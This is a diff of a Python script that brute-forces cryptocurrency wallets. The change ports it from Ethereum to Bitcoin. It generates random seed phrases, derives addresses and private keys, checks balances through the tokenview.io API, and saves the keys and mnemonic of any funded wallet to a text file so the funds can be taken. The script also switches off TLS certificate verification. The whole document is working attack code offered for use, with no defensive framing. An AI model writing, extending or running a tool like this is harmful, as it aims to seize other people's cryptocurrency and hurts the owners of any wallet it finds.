@@ -1,20 +1,19 @@
 import asyncio
 import datetime
 import ssl
+import uuid
 
 import aiohttp
-import eth_account
-from mnemonic import Mnemonic
+from bitcoinlib.wallets import Wallet, wallet_delete
+from bitcoinlib.mnemonic import Mnemonic
 from termcolor import colored
 
-
-eth_account.Account.enable_unaudited_hdwallet_features()
 
 ssl_context = ssl.create_default_context()
 ssl_context.check_hostname = False
 ssl_context.verify_mode = ssl.CERT_NONE
 
-semaphore = asyncio.Semaphore(10)
+semaphore = asyncio.Semaphore(3)
 
 
 def logger(message, type='info'):
@@ -30,13 +29,12 @@ def logger(message, type='info'):
 
 
 def generate_seed_phrase():
-    length = 12
     mnemo = Mnemonic('english')
-    return mnemo.generate(strength=(length // 3) * 32)
+    return mnemo.generate()
 
 
-async def scrape_blockscan(session, address):
-    url = f'https://eth.tokenview.io/api/search/{address}'
+async def scrape_blockchain_info(session, address):
+    url = f'https://btc.tokenview.io/api/search/{address}'
 
     try:
         async with semaphore:
@@ -45,38 +43,47 @@ async def scrape_blockscan(session, address):
                     wallet_info = await response.json()
                     wallet_code = wallet_info.get('code')
                     if wallet_code == 1:
-                        balance = wallet_info.get('data')[0].get('balance')
+                        wallet_data = wallet_info.get('data')[0]
+                        if float(wallet_data.get('spend')) == 0 and float(wallet_data.get('receive')) > 0:
+                            balance = wallet_data.get('receive')
+                        else:
+                            balance = '0.00'
                         return balance
                     else:
-                        return '$0.00'
+                        return '0.00'
                 else:
                     logger(f"API error: {response.status}", 'error')
-                    return '$0.00'
+                    return '0.00'
     except Exception as ex:
         logger(f"Exception occurred: {ex}", 'error')
-        return '$0.00'
+        return '0.00'
 
 
 async def check_wallets(session):
     while True:
         try:
             seed_phrase = generate_seed_phrase()
-            account = eth_account.Account.from_mnemonic(seed_phrase)
+            wallet_name = f'temp_wallet_{uuid.uuid4()}'
+            wallet = Wallet.create(name=wallet_name, keys=seed_phrase, network='bitcoin')
+            address = wallet.get_key().address
+            private_key = wallet.get_key().key_private.hex()
 
-            logger(f"👾 Address: {account.address}", 'info')
+            logger(f"👾 Address: {address}", 'info')
             logger(f"💬 Mnemonic: {seed_phrase}", 'info')
-            logger(f"🔑 Private key: {account.key.hex()}", 'info')
+            logger(f"🔑 Private key: {private_key}", 'info')
 
-            eth_balance = await scrape_blockscan(session, account.address)
+            balance = await scrape_blockchain_info(session, address)
 
-            logger(f"🤑 ETH Balance: {eth_balance}", 'info')
-            if eth_balance != '$0.00':
+            logger(f"🤑 BTC Balance: {balance}", 'info')
+
+            if float(balance) > 0.0:
                 logger("🎉 Found a wallet with a non-zero balance!", 'success')
-                with open('wallets.txt', 'a') as file:
-                    file.write(f"👾 Address: {account.address}\n💬 Mnemonic: {seed_phrase}\n🔑 "
-                               f"Private key: {account.key.hex()}\n🤑 ETH Balance: {eth_balance}\n🤑\n\n")
+                with open('wallets_btc.txt', 'a') as file:
+                    file.write(f"👾 Address: {address}\n💬 Mnemonic: {seed_phrase}\n🔑 Private key: "
+                               f"{private_key}\n🤑 BTC Balance: {balance}\n\n")
             else:
                 logger("👎 No luck this time.", 'warning')
+            wallet_delete(wallet_name)
 
         except Exception as e:
             logger(f"An error occurred: {e}", 'error')
@@ -84,7 +91,7 @@ async def check_wallets(session):
 
 async def run_bruteforce():
     async with aiohttp.ClientSession() as session:
-        tasks = [check_wallets(session) for _ in range(10)]
+        tasks = [check_wallets(session) for _ in range(2)]
         await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
